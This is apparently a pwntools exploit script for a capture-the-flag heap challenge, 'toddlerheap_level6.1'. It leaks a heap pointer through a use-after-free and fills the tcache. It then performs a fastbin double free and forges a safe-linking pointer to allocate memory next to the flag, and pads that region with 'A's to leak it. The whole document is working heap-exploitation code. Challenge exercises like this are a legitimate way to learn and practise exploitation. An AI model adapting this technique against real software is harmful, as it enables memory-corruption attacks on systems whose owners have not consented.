# fastbin_dup_into_stack, calloc to a region before flag, fill with A, leak flag

from pwn import *

malloc_size = 8

context.arch = 'amd64'

p = process("/challenge/toddlerheap_level6.1")

def flag_loc_leak():
    p.recvuntil(b"Reading the flag into ")
    flag_loc = int(p.recvuntil(b'.')[:-1], 16)
    return flag_loc

def heap_leak():
    p.sendline(f"calloc 0 {malloc_size}")
    p.sendline(f"free 0")
    p.sendline(b"puts 0")
    p.recvuntil(b"Data: ")
    leak = p.recvuntil(b"\n")[:-1]
    leak = unpack(leak, 'all')
    return leak


def fill_tcache():
    for idx in range(7):
        p.sendline(f"calloc {idx} {malloc_size}")
    for idx in range(7):
        p.sendline(f"free {idx}")

def fastbin_dup_into_stack(target:int):
    for idx in range(2):
        p.sendline(f"calloc {idx} {malloc_size}")
    p.sendline(b"free 0")
    p.sendline(b"free 1")
    p.sendline(b"free 0")
    
    p.sendline(f"calloc 3 {malloc_size}")
    p.sendline(f"calloc 4 {malloc_size}")

    # write to flag_loc - global_to_flag_offset
    p.sendline(b"read_to_global")
    p.sendline(b"16")
    payload = p64(0) + p64(0x20)
    p.send(payload)

    # alloc to global
    p.sendline("safer_read")
    p.sendline(b"3")
    p.sendline(p64(heap_leak ^ target))
    p.sendline(f"calloc 5 {malloc_size}")
    p.sendline(f"calloc 6 {malloc_size}")

    # fill the gap between gloabl and flag_loc
    p.sendline(b"read_to_global")
    p.sendline(str(global_to_flag_offset).encode('utf-8'))
    p.send(b'A'*global_to_flag_offset)
    

global_to_flag_offset = 0x2c8

flag_loc = flag_loc_leak()
print(f'flag_loc = {hex(flag_loc)}')
heap_leak = heap_leak()
print(f'heap_leak = {hex(heap_leak)}')
fill_tcache()
fastbin_dup_into_stack(flag_loc - global_to_flag_offset)

p.interactive()
